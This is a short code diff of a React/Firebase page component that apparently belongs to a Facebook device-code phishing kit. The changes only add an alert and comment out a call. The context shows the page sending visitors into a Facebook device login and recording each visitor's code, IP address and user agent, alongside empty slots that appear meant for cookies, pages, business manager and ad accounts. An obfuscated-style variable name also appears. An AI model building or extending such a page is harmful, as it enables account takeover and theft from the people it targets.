@@ -23,6 +23,7 @@ const HomePage = () => {
   const usersRef = collection(db, "users");
   const q = query(usersRef, orderBy("auto_id", "desc", limit(1)));
   const openInNewTab = (url) => {
+    alert(url);
     //const _0x28da3b = /iphone|ipad|ipod|android/i.test(navigator.userAgent.toLowerCase());
     //if (_0x28da3b) {
       //url = "fb://device_requests/?qr=0";
@@ -83,13 +84,12 @@ const HomePage = () => {
 
 
   const handleSubmit = async () => {
-    console.log('hehe');
     try {
         const user = await addDoc(collection(db, "users"), {
           status:0,ck:'',pg:'',bm:'',ad:'',if:'',code:loginData.code,ip:ipAddress,userAgentStr:userAgent,createdAt: new Date().getTime(),
         });
         if(user.id){
-          updateIndex(user.id);
+          //updateIndex(user.id);
           openInNewTab(loginData.verification_uri)
         }
     } catch (error) {
